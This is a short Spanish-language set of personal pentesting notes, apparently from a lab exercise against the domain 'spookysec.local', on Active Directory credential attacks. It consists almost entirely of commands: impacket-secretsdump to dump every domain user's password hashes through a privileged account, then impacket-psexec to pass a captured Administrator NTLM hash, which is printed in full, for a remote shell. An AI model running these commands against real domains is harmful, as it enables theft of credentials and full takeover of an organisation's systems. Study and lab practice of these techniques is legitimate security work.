- Tags : #impacket #hash #pass_the_hash 



```bash

#Ataque para intentar obtener las contrasenas de todos los usuarios del dominio incluso el del admin, vale aclarar que para que esto ocurra el usuario que utilicemos debe tener determinados privilegios. Debemos tener el usuario y la password 
 
impacket-secretsdump -just-dc user@ip_dominio

impacket-secretsdump -just-dc backup@172.9.98.2

```

#Aqui obtenemos el listado de usuarios con sus hashes lo que nos daria la posibilidad de intentar otro ataque como pass de hash

![](../../../attachments/Pasted%20image%2020260212122752.png)

```bash
impacket-psexec Administrado:@dominio -hashes hahs

impacket-psexec Administrado:@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

```

![](../../../attachments/Pasted%20image%2020260212123403.png)